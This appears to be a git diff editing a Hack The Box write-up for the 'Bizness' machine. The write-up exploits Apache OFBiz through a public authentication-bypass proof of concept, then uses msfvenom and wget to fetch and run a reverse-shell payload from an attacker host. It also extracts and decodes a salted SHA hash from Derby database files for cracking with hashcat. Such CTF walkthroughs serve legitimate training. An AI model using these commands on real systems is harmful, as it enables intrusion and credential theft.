@@ -3,17 +3,17 @@
 ### TL;DR
 This is an Ubuntu machine running a vulnerable version of ApacheOFBiz. A POC can be used to attack the webserver running on port 80 an get initial foothold. The root password hash can be found in the file system in base64url format.
 
-**KEYWORDS**<br>
+### KEYWORDS
 Apache OFBiz, exploit search, java, base64url
 
-**REFERENCES**<br>
+### REFERENCES
 https://ofbiz.apache.org<br>
 https://www.cvedetails.com/cve/CVE-2023-51467<br>
 https://www.cvedetails.com/cve/CVE-2023-49070<br>
 https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass<br>
 https://github.com/apache/ofbiz<br>
 https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java<br>
-<br>
+
 ### ENUMERATION
 Launch a port scan with `nmap`
 ```markdown
@@ -111,7 +111,7 @@ Looking for ApacheOFBiz vulnerabilities, we came across these ones https://www.c
 <br>
 And this POC https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass<br>
 <br>
-The exploit is supposed to provide direct RCE when executed against the host. First we can check if we have RC by issuing a ping command.
+The exploit is supposed to provide direct RCE when executed against the host. We will test if it works issuing a ping command.
 ```markdown
 > python3 exploit.py --url https://bizness.htb --cmd 'ping 10.10.xxx.xxx'
 [+] Generating payload...
@@ -120,7 +120,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [+] Sending malicious serialized payload
 [+] The request has been successfully sent. Check the result of the command.
 ```
-And verifying we receive replies in kali.
+And  then verifying we receive ping requests in kali.
 ```markdown
 > sudo tcpdump -i tun0 icmp         
 [sudo] password for kali: 
@@ -151,7 +151,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 76 packets received by filter
 0 packets dropped by kernel
 ```
-Once we have verified the POC provides direct RCE, next step is get a reverse on the host. For this, first we create an `msfvenom` payload and serve it with a python web server, next we start a listener on port 9000, 
+Once we have verified the POC provides direct RCE, next step is get a reverse on the host. For this, create an `msfvenom` payload and serve it with a python web server. Also, start a listener on port 9000, 
 ```markdown
 > msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=9000 -f elf -a x64
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -162,7 +162,7 @@ Saved as: shell
 
 > python3 -m http.server 80
 ```
-Then we use the POC to download and execute shell payload into the host.
+Then we use the POC to download the shell payload into the host and execute it.
 ```markdown
 > python3 exploit.py --url https://bizness.htb --cmd 'wget http://10.10.14.137/shell'
 [+] Generating payload...
@@ -188,31 +188,32 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 A reverse shell is received on the listener, it can be used to get the user flag.
 
 ### ROOT
-We start from the low-priv shell on the host looking for clear text passwords in `.xml` files the filesystem, particularly in the `/opt` directory, where Apache OFBiz is installed.
+We start from the low-priv shell on the host looking for clear text passwords contained in `.xml` files the filesystem, particularly in the `/opt` directory, where Apache OFBiz is installed.
 ```markdown
 grep --color=always -rn /opt -ie "PASSWORD" 2> /dev/null | grep xml
 ```
-Some SHA hashes are found, none of them useful thoguh. Next step is to look for password or hashes in the binary files of the derby database.
+Some SHA hashes are found, none of them useful though. Next step is to look for password or hashes in the binary files of the Apache OFBIz Derby database.
 ```markdown
 grep -E -i -a -o 'password(\W+\w+){0,5}' /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat
 ```
-This command returns a hash contained the file `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`
+This command returns a hash contained in the file `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`
 ```markdown
 $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
 ```
-This cannot be cracked as-is, a little investigation is needed to find out where this hash comed from. We need to refer to the apache ofbiz source code (available at https://github.com/apache/ofbiz) to understand how this hash has been formed. In particular, source for the java app that generates the hash is located at https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java<br>
+This cannot be cracked as-is, a little investigation is needed to find out where this hash come from. We need to refer to the Apache OFBiz source code (available at https://github.com/apache/ofbiz) to understand how this hash has been formed. In particular, source for the java app that generates the hash is located at https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java<br>
 <br>
 Reading the java code, we can see the hash is structured as: `$SHA$ + SALT +$ + HASH BYTES`. Also, it seems the hash bytes are base64url encoded.
 
 ![Untitled2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/99e7783a-b81b-4697-804a-b3a71297169c)
 
-Base64url encoding is just a standard base64 encoding where url problematic characters, such as "/" or ".", are removed, so the resulting string can be used in URL's.<br>
+Base64url encoding is just a standard base64 encoding where URL-problematic characters, such as "/" or ".", are removed, so the resulting string can be used in URL's.<br>
 <br>
-So we can conclude that to obtain a crackable hash, we have to revert the process. First we need to re-add the url-removed characters, and then base64-decode the result.<br>
+To obtain a crackable hash, we have to revert the process. First we need to restore the url-removed characters, and then decode the result using standard base64.<br>
 <br>
 Transform base64url back to base64 by changing "_" as "/", and "-" as "+".<br>
-`uP0_QaVBpDWFeo8-dRzDqRwXQ2I  uP0/QaVBpDWFeo8+dRzDqRwXQ2I`<br>
-Once we have the base64 string, we just decode it and transofrm the result to hex, the final hash obtained is `b8fd3f41a541a435857a8f3e751cc3a91c174362`<br>
+`uP0_QaVBpDWFeo8-dRzDqRwXQ2I --> uP0/QaVBpDWFeo8+dRzDqRwXQ2I`<br>
+<br>
+Once we have the base64 string, we just decode it and transform the result to HEX, the final hash obtained is `b8fd3f41a541a435857a8f3e751cc3a91c174362`<br>
 <br>
 Final step is to crack the hash using hashcat, taking into account the salt (":d").<br>
 ```markdown
